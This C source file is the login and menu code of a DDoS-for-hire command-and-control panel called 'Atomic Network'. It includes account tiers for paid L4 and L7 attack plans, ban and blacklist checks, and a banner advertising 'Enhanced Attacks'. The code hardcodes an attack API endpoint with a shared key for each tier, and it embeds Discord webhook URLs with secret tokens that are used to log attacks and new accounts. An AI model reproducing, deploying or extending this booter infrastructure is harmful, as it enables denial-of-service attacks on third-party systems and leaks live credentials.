#include "headers/headers.h"

static volatile int AtomicNukes = 0;

void TitleBar()
{
	int l;
	char usethis[1024];
	while (1)
	{
		for (l = 0; l < 5000; l++)
		{
			if (!Users[l].connected)
			{
				sprintf(usethis, "\033]0;Atomic | Made by Atomic.\007");
				continue;
			}
			switch (Users[l].titlestatus)
			{
			case 0:
				sprintf(usethis, "\033]0; Atomic Network | Total Users Online: [%d] | discord.gg/at0m1c\007", AtomicNukes);
				break;
			}
			socketWrite(l, usethis);
		}
		usleep(750000);
	}
}

static void captchaCurl(char *data)
{
	CURL *curl;
	struct curl_slist *hs = NULL;

	hs = curl_slist_append(hs, "Content-Type: application/json");

	if ((curl = curl_easy_init()))
	{
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hs);
		curl_easy_setopt(curl, CURLOPT_URL, "https://discord.com/api/webhooks/1027356076103974932/7VAA9xD1n2VGPWlpmVgfwhDpogSAtIGGvv8PATIuVfFaIwbEtwo47e40bu0pPYACTBid");
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

		curl_easy_perform(curl);
		curl_easy_cleanup(curl);
	}
}

static void accMadeCurl(char *data)
{
	CURL *curl;
	struct curl_slist *hs = NULL;

	hs = curl_slist_append(hs, "Content-Type: application/json");

	if ((curl = curl_easy_init()))
	{
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hs);
		curl_easy_setopt(curl, CURLOPT_URL, "https://discord.com/api/webhooks/1027356776347213825/nCXacYBBwoRldCpEjHCH2srqDXla5V3LCOQGqBzGolJxUdgfq3Q2Igm-Rm7s5rGLmSU-");
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

		curl_easy_perform(curl);
		curl_easy_cleanup(curl);
	}
}

static void attackLogCurl(char *data)
{
	CURL *curl;
	struct curl_slist *hs = NULL;

	hs = curl_slist_append(hs, "Content-Type: application/json");

	if ((curl = curl_easy_init()))
	{
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hs);
		curl_easy_setopt(curl, CURLOPT_URL, "https://discord.com/api/webhooks/1027356776347213825/nCXacYBBwoRldCpEjHCH2srqDXla5V3LCOQGqBzGolJxUdgfq3Q2Igm-Rm7s5rGLmSU-");
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

		curl_easy_perform(curl);
		curl_easy_cleanup(curl);
	}
}

void stringEncryption(char string[], int stringEncryptionKey)
{
	for (int i = 0; i < strlen(string); i++)
	{
		string[i] = string[i] - stringEncryptionKey;
	}
}

void stringDecryption(char string[], int stringDecryptionKey)
{
	for (int i = 0; i < strlen(string); i++)
	{
		string[i] = string[i] + stringDecryptionKey;
	}
}

void banner(int datafd)
{
	socketWrite(datafd, "\033[2J\033[1;1H");
	socketWrite(datafd, "\x1b\e[0m\r\n");
	socketWrite(datafd, "              \e[38;2;0;200;255m╔\e[38;2;0;203;240m═\e[38;2;0;206;225m╗ \e[38;2;0;212;195m╔\e[38;2;0;216;180m╦\e[38;2;0;219;165m╗ \e[38;2;0;225;135m╔\e[38;2;0;229;120m═\e[38;2;0;232;105m╗ \e[38;2;0;238;75m╔\e[38;2;0;242;60m╦\e[38;2;0;245;45m╗ \e[38;2;0;251;15m╦ \e[38;2;7;240;15m╔\e[38;2;15;225;30m═\e[38;2;22;210;45m╗   \e[38;2;52;150;105m╔\e[38;2;60;135;120m╗\e[38;2;67;120;135m╔ \e[38;2;82;90;165m╔\e[38;2;90;75;180m═\e[38;2;97;60;195m╗ \e[38;2;112;30;225m╔\e[38;2;120;15;240m╦\e[38;2;128;0;255m╗ \e[38;2;142;0;225m╦ \e[38;2;157;0;195m╦ \e[38;2;172;0;165m╔\e[38;2;180;0;150m═\e[38;2;187;0;135m╗ \e[38;2;202;0;105m╦\e[38;2;210;0;90m═\e[38;2;217;0;75m╗ \e[38;2;232;0;45m╦\e[38;2;240;0;30m╔\e[38;2;247;0;15m═\r\n");
	socketWrite(datafd, "              \e[38;2;0;200;255m╠\e[38;2;0;203;240m═\e[38;2;0;206;225m╣  \e[38;2;0;216;180m║  \e[38;2;0;225;135m║ \e[38;2;0;232;105m║ \e[38;2;0;238;75m║\e[38;2;0;242;60m║\e[38;2;0;245;45m║ \e[38;2;0;251;15m║ \e[38;2;7;240;15m║     \e[38;2;52;150;105m║\e[38;2;60;135;120m║\e[38;2;67;120;135m║ \e[38;2;82;90;165m║\e[38;2;90;75;180m╣   \e[38;2;120;15;240m║  \e[38;2;142;0;225m║\e[38;2;150;0;210m║\e[38;2;157;0;195m║ \e[38;2;172;0;165m║ \e[38;2;187;0;135m║ \e[38;2;202;0;105m╠\e[38;2;210;0;90m╦\e[38;2;217;0;75m╝ \e[38;2;232;0;45m╠\e[38;2;240;0;30m╩\e[38;2;247;0;15m╗\r\n");
	socketWrite(datafd, "              \e[38;2;0;200;255m╩ \e[38;2;0;206;225m╩  \e[38;2;0;216;180m╩  \e[38;2;0;225;135m╚\e[38;2;0;229;120m═\e[38;2;0;232;105m╝ \e[38;2;0;238;75m╩ \e[38;2;0;245;45m╩ \e[38;2;0;251;15m╩ \e[38;2;7;240;15m╚\e[38;2;15;225;30m═\e[38;2;22;210;45m╝   \e[38;2;52;150;105m╝\e[38;2;60;135;120m╚\e[38;2;67;120;135m╝ \e[38;2;82;90;165m╚\e[38;2;90;75;180m═\e[38;2;97;60;195m╝  \e[38;2;120;15;240m╩  \e[38;2;142;0;225m╚\e[38;2;150;0;210m╩\e[38;2;157;0;195m╝ \e[38;2;172;0;165m╚\e[38;2;180;0;150m═\e[38;2;187;0;135m╝ \e[38;2;202;0;105m╩\e[38;2;210;0;90m╚\e[38;2;217;0;75m═ \e[38;2;232;0;45m╩ \e[38;2;247;0;15m╩\r\n");
	socketWrite(datafd, "            \e[38;2;0;255;172m🚀 \e[38;2;255;0;0m𝓐𝓽𝓸𝓶𝓲𝓬 𝓝𝓮𝓽𝔀𝓸𝓻𝓴, \e[38;2;200;0;255m𝓕𝓾𝓵𝓮𝓭 𝓦𝓲𝓽𝓱 𝓟𝓸𝔀𝓮𝓻, \e[38;2;0;255;98m𝓔𝓷𝓱𝓪𝓷𝓬𝓮𝓭 𝓐𝓽𝓽𝓪𝓬𝓴𝓼 \e[38;2;249;0;13m🚀\e[0m\r\n");
	socketWrite(datafd, "           \e[38;2;0;255;189m╔\e[38;2;0;255;180m═\e[38;2;0;255;172m═\e[38;2;0;255;164m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;139m═\e[38;2;0;255;131m═\e[38;2;0;255;122m═\e[38;2;0;255;114m═\e[38;2;0;255;106m═\e[38;2;0;255;98m═\e[38;2;0;255;89m═\e[38;2;0;255;81m═\e[38;2;0;255;73m═\e[38;2;0;255;64m╦\e[38;2;6;243;73m═\e[38;2;13;231;82m═\e[38;2;20;219;91m═\e[38;2;27;207;100m═\e[38;2;34;195;109m═\e[38;2;41;183;118m═\e[38;2;48;170;127m═\e[38;2;54;158;136m═\e[38;2;61;146;145m═\e[38;2;68;134;154m═\e[38;2;75;122;164m═\e[38;2;82;110;173m═\e[38;2;89;98;182m═\e[38;2;96;85;191m═\e[38;2;102;73;200m═\e[38;2;109;61;209m═\e[38;2;116;49;218m═\e[38;2;123;37;227m═\e[38;2;130;25;236m═\e[38;2;137;13;245m═\e[38;2;144;0;255m═\e[38;2;149;0;243m═\e[38;2;154;0;231m═\e[38;2;159;0;219m═\e[38;2;165;0;207m╦\e[38;2;170;0;195m═\e[38;2;175;0;183m═\e[38;2;181;0;170m═\e[38;2;186;0;158m═\e[38;2;191;0;146m═\e[38;2;196;0;134m═\e[38;2;202;0;122m═\e[38;2;207;0;110m═\e[38;2;212;0;98m═\e[38;2;218;0;85m═\e[38;2;223;0;73m═\e[38;2;228;0;61m═\e[38;2;233;0;49m═\e[38;2;239;0;37m═\e[38;2;244;0;25m═\e[38;2;249;0;13m╗\r\n");
	socketWrite(datafd, "                \e[38;2;0;255;147m╔\e[38;2;0;255;139m═\e[38;2;0;255;131m═\e[38;2;0;255;122m═\e[38;2;0;255;114m═\e[38;2;0;255;106m═\e[38;2;0;255;98m═\e[38;2;0;255;89m═\e[38;2;0;255;81m═\e[38;2;0;255;73m═\e[38;2;0;255;64m╩\e[38;2;6;243;73m═\e[38;2;13;231;82m═\e[38;2;20;219;91m═\e[38;2;27;207;100m═\e[38;2;34;195;109m═\e[38;2;41;183;118m═\e[38;2;48;170;127m═\e[38;2;54;158;136m═\e[38;2;61;146;145m═\e[38;2;68;134;154m═\e[38;2;75;122;164m═\e[38;2;82;110;173m═\e[38;2;89;98;182m═\e[38;2;96;85;191m═\e[38;2;102;73;200m═\e[38;2;109;61;209m═\e[38;2;116;49;218m═\e[38;2;123;37;227m═\e[38;2;130;25;236m═\e[38;2;137;13;245m═\e[38;2;144;0;255m═\e[38;2;149;0;243m═\e[38;2;154;0;231m═\e[38;2;159;0;219m═\e[38;2;165;0;207m╩\e[38;2;170;0;195m═\e[38;2;175;0;183m═\e[38;2;181;0;170m═\e[38;2;186;0;158m═\e[38;2;191;0;146m═\e[38;2;196;0;134m═\e[38;2;202;0;122m═\e[38;2;207;0;110m═\e[38;2;212;0;98m═\e[38;2;218;0;85m═\e[38;2;223;0;73m╗\r\n");
	socketWrite(datafd, "                \e[38;2;0;255;147m║ \e[38;2;0;255;238mAtomic Network, \e[38;2;255;0;0mWhere it all is! Type \e[38;2;0;255;238m\"HELP\"\e[38;2;223;0;73m║\r\n");
	socketWrite(datafd, "                \e[38;2;0;255;147m╚\e[38;2;0;255;139m═\e[38;2;0;255;131m═\e[38;2;0;255;122m═\e[38;2;0;255;114m═\e[38;2;0;255;106m═\e[38;2;0;255;98m═\e[38;2;0;255;89m═\e[38;2;0;255;81m═\e[38;2;0;255;73m═\e[38;2;0;255;64m═\e[38;2;6;243;73m═\e[38;2;13;231;82m╦\e[38;2;20;219;91m═\e[38;2;27;207;100m═\e[38;2;34;195;109m═\e[38;2;41;183;118m═\e[38;2;48;170;127m═\e[38;2;54;158;136m═\e[38;2;61;146;145m═\e[38;2;68;134;154m═\e[38;2;75;122;164m═\e[38;2;82;110;173m═\e[38;2;89;98;182m═\e[38;2;96;85;191m═\e[38;2;102;73;200m═\e[38;2;109;61;209m═\e[38;2;116;49;218m═\e[38;2;123;37;227m═\e[38;2;130;25;236m═\e[38;2;137;13;245m═\e[38;2;144;0;255m═\e[38;2;149;0;243m═\e[38;2;154;0;231m╦\e[38;2;159;0;219m═\e[38;2;165;0;207m═\e[38;2;170;0;195m═\e[38;2;175;0;183m═\e[38;2;181;0;170m═\e[38;2;186;0;158m═\e[38;2;191;0;146m═\e[38;2;196;0;134m═\e[38;2;202;0;122m═\e[38;2;207;0;110m═\e[38;2;212;0;98m═\e[38;2;218;0;85m═\e[38;2;223;0;73m╝\r\n");
	socketWrite(datafd, "                       \e[38;2;0;255;89m╔\e[38;2;0;255;81m═\e[38;2;0;255;73m═\e[38;2;0;255;64m═\e[38;2;6;243;73m═\e[38;2;13;231;82m╩\e[38;2;20;219;91m═\e[38;2;27;207;100m═\e[38;2;34;195;109m═\e[38;2;41;183;118m═\e[38;2;48;170;127m═\e[38;2;54;158;136m═\e[38;2;61;146;145m═\e[38;2;68;134;154m═\e[38;2;75;122;164m═\e[38;2;82;110;173m═\e[38;2;89;98;182m═\e[38;2;96;85;191m═\e[38;2;102;73;200m═\e[38;2;109;61;209m═\e[38;2;116;49;218m═\e[38;2;123;37;227m═\e[38;2;130;25;236m═\e[38;2;137;13;245m═\e[38;2;144;0;255m═\e[38;2;149;0;243m═\e[38;2;154;0;231m╩\e[38;2;159;0;219m═\e[38;2;165;0;207m═\e[38;2;170;0;195m═\e[38;2;175;0;183m═\e[38;2;181;0;170m╗\r\n");
	socketWrite(datafd, "                       \e[38;2;0;255;89m║\e[38;2;200;0;255m   https://discord.gg/\e[38;2;0;255;238mat0m1c\e[38;2;181;0;170m  ║\r\n");
	socketWrite(datafd, "                       \e[38;2;0;255;89m╚\e[38;2;0;255;81m═\e[38;2;0;255;73m═\e[38;2;0;255;64m═\e[38;2;6;243;73m═\e[38;2;13;231;82m╦\e[38;2;20;219;91m═\e[38;2;27;207;100m═\e[38;2;34;195;109m═\e[38;2;41;183;118m═\e[38;2;48;170;127m═\e[38;2;54;158;136m═\e[38;2;61;146;145m═\e[38;2;68;134;154m═\e[38;2;75;122;164m═\e[38;2;82;110;173m═\e[38;2;89;98;182m═\e[38;2;96;85;191m═\e[38;2;102;73;200m═\e[38;2;109;61;209m═\e[38;2;116;49;218m═\e[38;2;123;37;227m═\e[38;2;130;25;236m═\e[38;2;137;13;245m═\e[38;2;144;0;255m═\e[38;2;149;0;243m═\e[38;2;154;0;231m╦\e[38;2;159;0;219m═\e[38;2;165;0;207m═\e[38;2;170;0;195m═\e[38;2;175;0;183m═\e[38;2;181;0;170m╝\r\n");
	socketWrite(datafd, "                \e[38;2;0;255;147m╔\e[38;2;0;255;139m═\e[38;2;0;255;131m═\e[38;2;0;255;122m═\e[38;2;0;255;114m═\e[38;2;0;255;106m═\e[38;2;0;255;98m═\e[38;2;0;255;89m═\e[38;2;0;255;81m═\e[38;2;0;255;73m═\e[38;2;0;255;64m═\e[38;2;6;243;73m═\e[38;2;13;231;82m╩\e[38;2;20;219;91m═\e[38;2;27;207;100m═\e[38;2;34;195;109m═\e[38;2;41;183;118m═\e[38;2;48;170;127m═\e[38;2;54;158;136m═\e[38;2;61;146;145m═\e[38;2;68;134;154m═\e[38;2;75;122;164m═\e[38;2;82;110;173m═\e[38;2;89;98;182m═\e[38;2;96;85;191m═\e[38;2;102;73;200m═\e[38;2;109;61;209m═\e[38;2;116;49;218m═\e[38;2;123;37;227m═\e[38;2;130;25;236m═\e[38;2;137;13;245m═\e[38;2;144;0;255m═\e[38;2;149;0;243m═\e[38;2;154;0;231m╩\e[38;2;159;0;219m═\e[38;2;165;0;207m═\e[38;2;170;0;195m═\e[38;2;175;0;183m═\e[38;2;181;0;170m═\e[38;2;186;0;158m═\e[38;2;191;0;146m═\e[38;2;196;0;134m═\e[38;2;202;0;122m═\e[38;2;207;0;110m═\e[38;2;212;0;98m═\e[38;2;218;0;85m═\e[38;2;223;0;73m╗\r\n");
	socketWrite(datafd, "                \e[38;2;0;255;147m║ \e[38;2;0;255;238m Atomic Network, \e[38;2;0;255;98mMade And Powered by \e[38;2;0;255;238mAtomic\e[38;2;223;0;73m ║\r\n");
	socketWrite(datafd, "                \e[38;2;0;255;147m║         \e[38;2;0;255;98m Copyright \e[38;2;0;255;238mAtomic Network ©        \e[38;2;223;0;73m ║\r\n");
	socketWrite(datafd, "                \e[38;2;0;255;147m╚\e[38;2;0;255;139m═\e[38;2;0;255;131m═\e[38;2;0;255;122m═\e[38;2;0;255;114m═\e[38;2;0;255;106m═\e[38;2;0;255;98m═\e[38;2;0;255;89m═\e[38;2;0;255;81m═\e[38;2;0;255;73m═\e[38;2;0;255;64m═\e[38;2;6;243;73m═\e[38;2;13;231;82m═\e[38;2;20;219;91m═\e[38;2;27;207;100m═\e[38;2;34;195;109m═\e[38;2;41;183;118m═\e[38;2;48;170;127m═\e[38;2;54;158;136m═\e[38;2;61;146;145m═\e[38;2;68;134;154m═\e[38;2;75;122;164m═\e[38;2;82;110;173m═\e[38;2;89;98;182m═\e[38;2;96;85;191m═\e[38;2;102;73;200m═\e[38;2;109;61;209m═\e[38;2;116;49;218m═\e[38;2;123;37;227m═\e[38;2;130;25;236m═\e[38;2;137;13;245m═\e[38;2;144;0;255m═\e[38;2;149;0;243m═\e[38;2;154;0;231m═\e[38;2;159;0;219m═\e[38;2;165;0;207m═\e[38;2;170;0;195m═\e[38;2;175;0;183m═\e[38;2;181;0;170m═\e[38;2;186;0;158m═\e[38;2;191;0;146m═\e[38;2;196;0;134m═\e[38;2;202;0;122m═\e[38;2;207;0;110m═\e[38;2;212;0;98m═\e[38;2;218;0;85m═\e[38;2;223;0;73m╝\r\n");
	socketWrite(datafd, "\x1b\e[0m\r\n");
}

int blacklistChecker(char *target)
{
	char *line = NULL;
	size_t length = 0;

	FILE *blackListed = fopen("/root/Logs/BlackListed.txt", "r");

	trim(target);

	while (getline(&line, &length, blackListed) != -1)
	{
		if (strstr(line, target))
			return 1;
	}
	fclose(blackListed);
	return 0;
}

int banChecker(char *bannedUser)
{
	char *line = NULL;
	size_t length = 0;

	FILE *banned = fopen("/root/Logs/BannedUsers.txt", "r");

	trim(bannedUser);

	while (getline(&line, &length, banned) != -1)
	{
		if (strstr(line, bannedUser))
			return 1;
	}
	fclose(banned);
	return 0;
}

void AtomicCNC(void *sockfd)
{
	char LoginUser[30], LoginPass[30];
	int datafd = *((int *)sockfd), FileLogin = 0, SukBeans = 1;
	int argcount = 0, arglim = 0;
	char Args[1024][2028];
	char *ArgBuf;

#ifdef basicL4
	char *bl4ip = "134.122.113.192:8080/attack";
	char *bl4key = "AtomiccaponeAtomicqwerty";
#endif

#ifdef basicL7
	char *bl7ip = "134.122.113.192:8080/attack";
	char *bl7key = "AtomiccaponeAtomicqwerty";
#endif

#ifdef vipL4
	char *vl4ip = "134.122.113.192:8080/attack";
	char *vl4key = "AtomiccaponeAtomicqwerty";
#endif

#ifdef vipL7
	char *vl7ip = "134.122.113.192:8080/attack";
	char *vl7key = "AtomiccaponeAtomicqwerty";
#endif

#ifdef fmpL4
	char *fl4ip = "134.122.113.192:8080/attack";
	char *fl4key = "AtomiccaponeAtomicqwerty";
#endif

#ifdef rawL4
	char *rl4ip = "134.122.113.192:8080/attack";
	char *rl4key = "AtomiccaponeAtomicqwerty";
#endif

	Users[datafd].connected = 1;

	socketWrite(datafd, "\x1b[8;24;80t\007");
	socketWrite(datafd, "\e[38;2;255;0;0mPlease Join the new discord server\e[38;2;255;119;0m: \e[38;2;255;247;0mhttps://discord.gg/at0m1c\r\n");
	socketWrite(datafd, "\e[38;2;0;255;238mU\e[38;2;0;255;180ms\e[38;2;0;255;122me\e[38;2;0;255;64mr\e[38;2;48;170;127mn\e[38;2;96;85;191ma\e[38;2;144;0;255mm\e[38;2;181;0;170me\e[38;2;0;251;255m: ");
	memset(Users[datafd].buf, sizeof(Users[datafd].buf), 0);
	if (fdgets(Users[datafd].buf, 128, datafd) < 1)
		goto End;

	strcpy(LoginUser, Users[datafd].buf);

	socketWrite(datafd, "\x1b[38;2;255;0;0m\e[38;2;0;255;238mP\e[38;2;0;255;180ma\e[38;2;0;255;122ms\e[38;2;0;255;64ms\e[38;2;48;170;127mw\e[38;2;96;85;191mo\e[38;2;144;0;255mr\e[38;2;181;0;170md\e[38;2;218;0;85m: \e[38;2;0;251;255;48;2;0;251;255m");
	memset(Users[datafd].buf, sizeof(Users[datafd].buf), 0);
	if (fdgets(Users[datafd].buf, 128, datafd) < 1)
		goto End;
	strcpy(LoginPass, Users[datafd].buf);

	ReloadAccounts();

	FileLogin = Find_Login(LoginUser);
	socketWrite(datafd, "\x1b[0m");
	if (strcmp(accounts[FileLogin].username, LoginUser) || strcmp(accounts[FileLogin].password, LoginPass))
	{
		socketWrite(datafd, "\e[38;2;0;251;255mA failed login attempt has been detected and logged\r\n");
		sleep(4);
		goto End;
	}
	if (!strcmp(accounts[FileLogin].username, LoginUser) && !strcmp(accounts[FileLogin].password, LoginPass))
		SukBeans = 0;

	if (!SukBeans)
	{
		if (strjcmp(accounts[FileLogin].status, "owner"))
			Users[datafd].ownerstatus = 1;
		else
			Users[datafd].ownerstatus = 0;

		if (strjcmp(accounts[FileLogin].status, "admin"))
			Users[datafd].adminstatus = 1;
		else
			Users[datafd].adminstatus = 0;

		if (strjcmp(accounts[FileLogin].status, "vip"))
			Users[datafd].vipstatus = 1;
		else
			Users[datafd].vipstatus = 0;

		if (strjcmp(accounts[FileLogin].status, "basic"))
			Users[datafd].basicstatus = 1;
		else
			Users[datafd].basicstatus = 0;

		if (strjcmp(accounts[FileLogin].status, "fmp"))
			Users[datafd].fmpstatus = 1;
		else
			Users[datafd].fmpstatus = 0;

		if (strjcmp(accounts[FileLogin].status, "raw"))
			Users[datafd].rawstatus = 1;
		else
			Users[datafd].rawstatus = 0;

		if (strjcmp(accounts[FileLogin].status, "bvfmp"))
			Users[datafd].bvfmp = 1;
		else
			Users[datafd].bvfmp = 0;

		if (strjcmp(accounts[FileLogin].status, "bfmp"))
			Users[datafd].bfmp = 1;
		else
			Users[datafd].bfmp = 0;

		if (strjcmp(accounts[FileLogin].status, "br"))
			Users[datafd].br = 1;
		else
			Users[datafd].br = 0;

		if (strjcmp(accounts[FileLogin].status, "brv"))
			Users[datafd].brv = 1;
		else
			Users[datafd].brv = 0;

		if (strjcmp(accounts[FileLogin].status, "brvfmp"))
			Users[datafd].brvfmp = 1;
		else
			Users[datafd].brvfmp = 0;

		if (strjcmp(accounts[FileLogin].status, "brfmp"))
			Users[datafd].brfmp = 1;
		else
			Users[datafd].brfmp = 0;

		strcpy(Users[datafd].username, accounts[FileLogin].username);
		strcpy(Users[datafd].secs, accounts[FileLogin].secs);

		// struct tm dateFormat = *localtime(&Users[datafd].expiry);
		// char expiryBuffer[100];
		AtomicNukes++;
		Users[datafd].confirmation = 1;

		Users[datafd].expiry = accounts[FileLogin].expiry;

		if (Users[datafd].expiry > time(NULL))
			socketWrite(datafd, "\033[2J\033[1;1H");

		else if (Users[datafd].expiry < time(NULL))
		{
			// strftime(expiryBuffer, sizeof(expiryBuffer), "%a - %d/%m - %H:%M:%S", &dateFormat);
			socketWrite(datafd, "\x1b\e[0m\r\n");
			socketWrite(datafd, "\e[38;2;255;0;0mYour account \e[38;2;255;0;230m[\e[38;2;0;255;60m");
			socketWrite(datafd, Users[datafd].username);
			socketWrite(datafd, "\e[38;2;255;0;230m] \e[38;2;255;0;0mhas expired, Please re-new your plan.\r\n");
			// socketWrite(datafd, expiryBuffer);
			// socketWrite(datafd, " | Please re-new your plan to continue\r\n");
			sleep(5);
			goto End;
			AtomicNukes--;
			Users[datafd].confirmation = 0;
		}

		char bannedUser[30];
		sprintf(bannedUser, "%s", Users[datafd].username);
		trim(bannedUser);

		if (banChecker(bannedUser) == 1)
		{
			socketWrite(datafd, "\x1b\e[0m\r\n");
			socketWrite(datafd, "\e[38;2;255;0;0mYour account \e[38;2;255;0;230m[\e[38;2;0;255;60m");
			socketWrite(datafd, Users[datafd].username);
			socketWrite(datafd, "\e[38;2;255;0;230m] \e[38;2;255;0;0mis \e[38;2;255;0;230m[\e[38;2;0;255;60mBANNED\e[38;2;255;0;230m] \e[38;2;255;0;0mPlease contact owner/admin!\r\n");

			sleep(5);
			goto End;
			AtomicNukes--;
			Users[datafd].confirmation = 0;
		}
		else if (banChecker(bannedUser) == 0)
			socketWrite(datafd, "\033[2J\033[1;1H");

		if (Users[datafd].adminstatus == 1 || Users[datafd].basicstatus == 1 || Users[datafd].vipstatus == 1 || Users[datafd].fmpstatus == 1 || Users[datafd].rawstatus == 1 || Users[datafd].bvfmp == 1 || Users[datafd].bfmp == 1 || Users[datafd].br == 1 || Users[datafd].brvfmp == 1 || Users[datafd].brfmp == 1)
		{
			socketWrite(datafd, "\033[2J\033[1;1H");
			socketWrite(datafd, "\x1b\e[0m\r\n");
			socketWrite(datafd, "                      \e[38;2;0;255;119m╦\e[38;2;0;255;110m═\e[38;2;0;255;101m╗ \e[38;2;0;255;83m╦ \e[38;2;0;255;64m╦ \e[38;2;15;229;84m╦   \e[38;2;45;175;124m╔\e[38;2;53;162;134m═\e[38;2;60;148;144m╗ \e[38;2;75;121;164m╔\e[38;2;83;108;174m═\e[38;2;90;94;184m╗  \e[38;2;113;54;214m╔\e[38;2;121;41;224m╦\e[38;2;128;27;234m╗ \e[38;2;144;0;255m╔\e[38;2;149;0;242m═\e[38;2;155;0;229m╗ \e[38;2;167;0;202m╔\e[38;2;173;0;188m╗\e[38;2;179;0;175m╔ \e[38;2;190;0;148m╦ \e[38;2;202;0;121m╦\r\n");
			socketWrite(datafd, "                      \e[38;2;0;255;119m╠\e[38;2;0;255;110m╦\e[38;2;0;255;101m╝ \e[38;2;0;255;83m║ \e[38;2;0;255;64m║ \e[38;2;15;229;84m║   \e[38;2;45;175;124m║\e[38;2;53;162;134m╣  \e[38;2;75;121;164m╚\e[38;2;83;108;174m═\e[38;2;90;94;184m╗  \e[38;2;113;54;214m║\e[38;2;121;41;224m║\e[38;2;128;27;234m║ \e[38;2;144;0;255m║\e[38;2;149;0;242m╣  \e[38;2;167;0;202m║\e[38;2;173;0;188m║\e[38;2;179;0;175m║ \e[38;2;190;0;148m║ \e[38;2;202;0;121m║\r\n");
			socketWrite(datafd, "                      \e[38;2;0;255;119m╩\e[38;2;0;255;110m╚\e[38;2;0;255;101m═ \e[38;2;0;255;83m╚\e[38;2;0;255;74m═\e[38;2;0;255;64m╝ \e[38;2;15;229;84m╩\e[38;2;22;215;94m═\e[38;2;30;202;104m╝ \e[38;2;45;175;124m╚\e[38;2;53;162;134m═\e[38;2;60;148;144m╝ \e[38;2;75;121;164m╚\e[38;2;83;108;174m═\e[38;2;90;94;184m╝  \e[38;2;113;54;214m╩ \e[38;2;128;27;234m╩ \e[38;2;144;0;255m╚\e[38;2;149;0;242m═\e[38;2;155;0;229m╝ \e[38;2;167;0;202m╝\e[38;2;173;0;188m╚\e[38;2;179;0;175m╝ \e[38;2;190;0;148m╚\e[38;2;196;0;135m═\e[38;2;202;0;121m╝\r\n");
			socketWrite(datafd, "             \e[38;2;0;255;172m🚀 \e[38;2;255;0;0m𝓐𝓽𝓸𝓶𝓲𝓬 𝓝𝓮𝓽𝔀𝓸𝓻𝓴, \e[38;2;200;0;255m𝓕𝓾𝓵𝓮𝓭 𝓦𝓲𝓽𝓱 𝓟𝓸𝔀𝓮𝓻, \e[38;2;0;255;98m𝓔𝓷𝓱𝓪𝓷𝓬𝓮𝓭 𝓐𝓽𝓽𝓪𝓬𝓴𝓼 \e[38;2;249;0;13m🚀\e[0m\r\n");
			socketWrite(datafd, "            \e[38;2;0;255;220m╔\e[38;2;0;255;211m═\e[38;2;0;255;202m═\e[38;2;0;255;193m═\e[38;2;0;255;184m═\e[38;2;0;255;174m═\e[38;2;0;255;165m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;138m═\e[38;2;0;255;129m═\e[38;2;0;255;119m═\e[38;2;0;255;110m╦\e[38;2;0;255;101m═\e[38;2;0;255;92m═\e[38;2;0;255;83m═\e[38;2;0;255;74m═\e[38;2;0;255;64m═\e[38;2;7;242;74m═\e[38;2;15;229;84m═\e[38;2;22;215;94m═\e[38;2;30;202;104m═\e[38;2;37;188;114m═\e[38;2;45;175;124m═\e[38;2;53;162;134m═\e[38;2;60;148;144m═\e[38;2;68;135;154m═\e[38;2;75;121;164m═\e[38;2;83;108;174m═\e[38;2;90;94;184m═\e[38;2;98;81;194m═\e[38;2;106;68;204m═\e[38;2;113;54;214m═\e[38;2;121;41;224m═\e[38;2;128;27;234m═\e[38;2;136;14;244m═\e[38;2;144;0;255m═\e[38;2;149;0;242m═\e[38;2;155;0;229m═\e[38;2;161;0;215m═\e[38;2;167;0;202m═\e[38;2;173;0;188m═\e[38;2;179;0;175m═\e[38;2;184;0;162m═\e[38;2;190;0;148m╦\e[38;2;196;0;135m═\e[38;2;202;0;121m═\e[38;2;208;0;108m═\e[38;2;214;0;94m═\e[38;2;219;0;81m═\e[38;2;225;0;68m═\e[38;2;231;0;54m═\e[38;2;237;0;41m═\e[38;2;243;0;27m═\e[38;2;249;0;14m══╗\r\n");
			socketWrite(datafd, "              \e[38;2;0;255;202m╔\e[38;2;0;255;193m═\e[38;2;0;255;184m═\e[38;2;0;255;174m═\e[38;2;0;255;165m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;138m═\e[38;2;0;255;129m═\e[38;2;0;255;119m═\e[38;2;0;255;110m╩\e[38;2;0;255;101m═\e[38;2;0;255;92m═\e[38;2;0;255;83m═\e[38;2;0;255;74m═\e[38;2;0;255;64m═\e[38;2;7;242;74m═\e[38;2;15;229;84m═\e[38;2;22;215;94m═\e[38;2;30;202;104m═\e[38;2;37;188;114m═\e[38;2;45;175;124m═\e[38;2;53;162;134m═\e[38;2;60;148;144m═\e[38;2;68;135;154m═\e[38;2;75;121;164m═\e[38;2;83;108;174m═\e[38;2;90;94;184m═\e[38;2;98;81;194m═\e[38;2;106;68;204m═\e[38;2;113;54;214m═\e[38;2;121;41;224m═\e[38;2;128;27;234m═\e[38;2;136;14;244m═\e[38;2;144;0;255m═\e[38;2;149;0;242m═\e[38;2;155;0;229m═\e[38;2;161;0;215m═\e[38;2;167;0;202m═\e[38;2;173;0;188m═\e[38;2;179;0;175m═\e[38;2;184;0;162m═\e[38;2;190;0;148m╩\e[38;2;196;0;135m═\e[38;2;202;0;121m═\e[38;2;208;0;108m═\e[38;2;214;0;94m═\e[38;2;219;0;81m═\e[38;2;225;0;68m═\e[38;2;231;0;54m═\e[38;2;237;0;41m═\e[38;2;243;0;27m═\e[38;2;249;0;14m╗\r\n");
			socketWrite(datafd, "              \e[38;2;0;255;202m║ \e[38;2;255;0;179mDO NOT hit/redirect govermental IPS/URL \e[38;2;255;0;0m[FORBIDEN]\e[38;2;249;0;14m║\r\n");
			socketWrite(datafd, "              \e[38;2;0;255;202m║ \e[38;2;255;0;179mDO NOT \e[38;2;255;0;0mspam attacks on [Atomic Network]           \e[38;2;249;0;14m║\r\n");
			socketWrite(datafd, "              \e[38;2;0;255;202m║ \e[38;2;255;0;179mDO NOT \e[38;2;255;0;0mdump [Atomic Network METHODS]              \e[38;2;249;0;14m║\r\n");
			socketWrite(datafd, "              \e[38;2;0;255;202m║ \e[38;2;255;0;179mSTRICTLY go by \e[38;2;255;0;0mIPv4 > L4 & VIP | URL > L7         \e[38;2;249;0;14m║\r\n");
